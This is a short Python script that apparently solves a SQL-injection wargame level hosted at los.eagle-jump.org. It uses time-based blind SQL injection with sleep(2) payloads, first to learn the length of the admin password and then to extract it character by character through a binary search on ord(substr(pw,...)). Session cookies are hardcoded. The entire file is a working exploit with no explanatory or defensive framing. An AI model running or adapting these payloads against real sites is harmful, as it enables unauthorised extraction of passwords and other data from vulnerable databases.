import requests
import time
def password_length():
	length=0
	while 1:
		length += 1
		query_add = query+"?pw=' or id='admin' and length(pw)="+str(length)+" and sleep(2) --%20"
		a=time.time()
		result=requests.get(query_add, cookies=cookie)
		b=time.time()
		#print(result.text.find("Hello"))
		#print(b-a)
		if(b-a>1):
			print("Length is : "+str(length))
			return length

def password(index):
	first=0
	last=255
	while(first<last):
		mid=(first+last)//2
		query_add=query+"?pw=' or id='admin' and ord(substr(pw,"+str(index)+",1))>="+str(mid)+" and sleep(2) --%20"
		a=time.time()
		result=requests.get(query_add, cookies=cookie)
		b=time.time()
		#print(first, last, result.text.find("Hello"))
		if(b-a>1):
			first=mid
			if(last==first+1):
				query_add=query+"?pw=' or id='admin' and ord(substr(pw,"+str(index)+",1))="+str(first)+" and sleep(2) --%20"
				a=time.time()
				result=requests.get(query_add, cookies=cookie)
				b=time.time()
				#print(b-a)
				if(b-a>1):
					return first
				else:
					return last
		else:
			last=mid-1

	return first

if(__name__=="__main__"):
	cookie={"__cfduid":"d5fd3bf70d66481907d3d06087b88ff011549863094","PHPSESSID":"afuov7bqip2lbk1o06n42o7g45"}
	query='https://los.eagle-jump.org/skeleton_8d9cbfe1efbd44cfbbdc63fa605e5f1b.php'
	length=password_length()
	for i in range(1, length+1):
		print(chr(password(i)),end="")